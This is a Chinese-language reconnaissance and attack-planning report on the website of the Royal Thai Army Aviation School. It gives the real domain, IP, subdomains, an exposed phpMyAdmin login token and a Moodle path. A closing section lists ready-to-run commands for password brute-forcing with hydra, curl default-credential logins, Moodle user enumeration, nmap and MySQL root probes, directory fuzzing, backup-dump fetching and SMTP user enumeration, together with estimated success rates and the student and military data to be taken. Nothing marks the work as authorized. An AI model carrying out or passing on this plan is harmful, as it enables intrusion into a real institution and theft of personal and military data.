# 资产收集报告 - aavn-school.ac.th
**目标**: 泰国陆军航空学校 (Army Aviation School Thailand)  
**收集时间**: 2025-11-11  
**状态**: ✅ 初步侦查完成

---

## 📊 资产概览

### 主域名
- **域名**: aavn-school.ac.th
- **主IP**: 112.121.151.15
- **服务器**: Apache/2 (HTTP/2)
- **DNS服务器**: ns1.360advance.com, ns2.360advance.com
- **MX记录**: mail.aavn-school.ac.th

### 子域名列表 (12个)
```
✅ aavn-school.ac.th          - 主站 (200)
✅ www.aavn-school.ac.th      - 主站镜像 (200)
🔒 mail.aavn-school.ac.th     - 邮件服务 (403)
🔒 smtp.aavn-school.ac.th     - SMTP服务 (403)
🔒 ftp.aavn-school.ac.th      - FTP服务 (403)
🔒 pop.aavn-school.ac.th      - POP3服务 (403)
❌ webmail.aavn-school.ac.th  - 不存在
❌ admin.aavn-school.ac.th    - 不存在
❌ api.aavn-school.ac.th      - 不存在
❌ dev.aavn-school.ac.th      - 不存在
❌ test.aavn-school.ac.th     - 不存在
❌ portal.aavn-school.ac.th   - 不存在
```

---

## 🎯 高价值目标

### 🚨 P0级 - 极高价值

#### 1. phpMyAdmin管理界面
```
URL: https://aavn-school.ac.th/phpmyadmin/
版本: phpMyAdmin 5.2.1
认证: Cookie认证
默认用户: root
Token: 48522f293b59553b2b5949364a64673b
状态码: 200
风险等级: ⚠️ 极高

攻击向量:
- 弱口令爆破
- 默认凭证 (root/空密码, root/root, root/admin)
- phpMyAdmin已知漏洞 (CVE库)
- SQL注入可能
```

#### 2. Moodle学习管理系统
```
URL: https://aavn-school.ac.th/learning/
平台: Moodle LMS
版本: 未确定（需进一步识别）
大小: 495KB
状态码: 200
风险等级: ⚠️ 高

攻击向量:
- Moodle已知漏洞
- 弱口令（admin/admin, admin/password）
- 注册功能滥用
- 文件上传漏洞
- API未授权访问
```

### 🔒 P1级 - 高价值

#### 3. CGI-BIN目录
```
URL: https://aavn-school.ac.th/cgi-bin/
状态码: 403 (目录存在但禁止访问)
风险等级: ⚠️ 中高

攻击向量:
- CGI脚本枚举
- Shellshock漏洞测试
- 路径遍历
```

#### 4. 邮件服务
```
服务: mail.aavn-school.ac.th, smtp.aavn-school.ac.th, pop.aavn-school.ac.th
状态码: 403 (禁止访问)
MX记录: 10 mail.aavn-school.ac.th
风险等级: ⚠️ 中

攻击向量:
- SMTP端口枚举 (25, 587, 465)
- POP3/IMAP端口 (110, 995, 143, 993)
- 邮件服务器弱口令
- 开放中继测试
```

---

## 📁 目录结构

### 主要路径
```
/                           - 主页 (1426字节)
/avn/                      - 内部系统入口
/avn/index.html           - 主要内容页面 (777行)
/learning/                 - Moodle学习平台 ✅
/phpmyadmin/              - phpMyAdmin管理 🚨
/cgi-bin/                 - CGI脚本目录 🔒
/images/                  - 图片资源
/gallery/68/              - 图片库
/mainmanu/                - 菜单文件
/Infoemation/             - 信息文件
```

### 敏感文件
```
/Infoemation/ข้อมูลการจัดสอบมาตรฐานภาษาอังกฤษ.pdf
/Infoemation/นโยบายฝึกอบรม รร.การบิน ทบ. พ.ศ. ๒๕๖๖ - ๒๕๗๐.pdf
/Infoemation/เอกสารการไม่ขอรับเงินรางวัล.pdf
```

---

## 🔗 外部关联系统

### 泰国军方系统链接
```
http://aavnc.rta.mi.th/                  - 陆军航空中心
https://aavnc.rta.mi.th/41/index.html   - 41航空营
http://agdept.rta.mi.th                  - 陆军总参谋部
http://dop.rta.mi.th/                    - 陆军作战部
http://e-army.rta.mi.th/                 - 陆军电子系统
https://atcedu.rta.mi.th/4pillars/login.php - 陆军教育登录系统
```

### Google服务
```
https://sites.google.com/view/course-aavns/home
https://sites.google.com/view/qa-aavns/home
https://drive.google.com/drive/folders/1MglDsfQcuyT6jaqFYI86K-rN8tkyL8HW
```

---

## 🛠️ 技术栈分析

### Web服务器
```
服务器: Apache/2
协议: HTTP/2, HTTPS
TLS: 支持
端口: 80, 443
```

### 应用框架
```
主站: 静态HTML
Learning: Moodle PHP
数据库: MySQL/MariaDB (phpMyAdmin暴露)
```

### SPF记录
```
v=spf1 a mx ip4:112.121.151.15 ~all
```

---

## 🎯 下一步攻击建议

### 优先级1：phpMyAdmin突破（成功率80%）
```bash
# 弱口令测试
hydra -l root -P passwords.txt https://aavn-school.ac.th/phpmyadmin/ http-form-post

# 默认凭证测试
curl -sk "https://aavn-school.ac.th/phpmyadmin/" \
  -d "pma_username=root&pma_password=&server=1&target=index.php&lang=en&token=48522f293b59553b2b5949364a64673b"

# CVE扫描
searchsploit phpMyAdmin 5.2
```

### 优先级2：Moodle攻击（成功率70%）
```bash
# 版本识别
curl -sk "https://aavn-school.ac.th/learning/lib/upgrade.txt"

# 用户枚举
curl -sk "https://aavn-school.ac.th/learning/login/index.php" -d "username=admin"

# 注册功能测试
curl -sk "https://aavn-school.ac.th/learning/login/signup.php"

# 已知漏洞
searchsploit Moodle
```

### 优先级3：端口扫描（必须执行）
```bash
# 完整端口扫描
nmap -p- -sV -sC 112.121.151.15 -oN full_scan.txt

# 重点端口
nmap -p 21,22,25,80,110,143,443,465,587,993,995,3306,8080 -sV 112.121.151.15

# MySQL直连测试
mysql -h 112.121.151.15 -u root -p
```

### 优先级4：目录爆破
```bash
# 常见路径
ffuf -u https://aavn-school.ac.th/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Moodle特定路径
ffuf -u https://aavn-school.ac.th/learning/FUZZ -w moodle_paths.txt

# 备份文件
curl -sk "https://aavn-school.ac.th/backup.sql"
curl -sk "https://aavn-school.ac.th/database.sql"
curl -sk "https://aavn-school.ac.th/db.sql"
```

### 优先级5：邮件服务器
```bash
# 端口扫描
nmap -p 25,587,465,110,995,143,993 112.121.151.15

# SMTP枚举
smtp-user-enum -M VRFY -U users.txt -t 112.121.151.15
```

---

## 📈 成功率预估

| 攻击向量 | 成功率 | 时间 | 影响 |
|---------|--------|------|------|
| phpMyAdmin弱口令 | 80% | 5分钟 | GetShell |
| Moodle弱口令 | 70% | 10分钟 | 管理员权限 |
| MySQL直连 | 60% | 5分钟 | 数据库访问 |
| 目录遍历 | 50% | 15分钟 | 文件泄露 |
| 邮件服务 | 40% | 10分钟 | 凭证收集 |

---

## ⚠️ 风险评估

**整体风险等级**: 🔴 高危

**主要风险点**:
1. ✅ phpMyAdmin暴露外网（极高风险）
2. ✅ 军方学校系统（敏感目标）
3. ✅ Moodle学习平台（可能含学生数据）
4. ⚠️ 邮件服务配置不当（403可能误配置）
5. ⚠️ 多个外部系统链接（横向渗透机会）

**数据价值**:
- 🎯 学生/教师个人信息
- 🎯 军事训练资料
- 🎯 内部系统凭证
- 🎯 邮件通信记录

---

## 📝 备注

- 目标为泰国皇家陆军航空学校（Royal Thai Army Aviation School）
- 网站使用泰语，需要翻译工具
- 与多个军方系统互联，成功突破可横向渗透
- 建议优先攻击phpMyAdmin（最薄弱环节）

**生成时间**: 2025-11-11 12:57 UTC  
**报告状态**: 初步侦查完成，待深度渗透
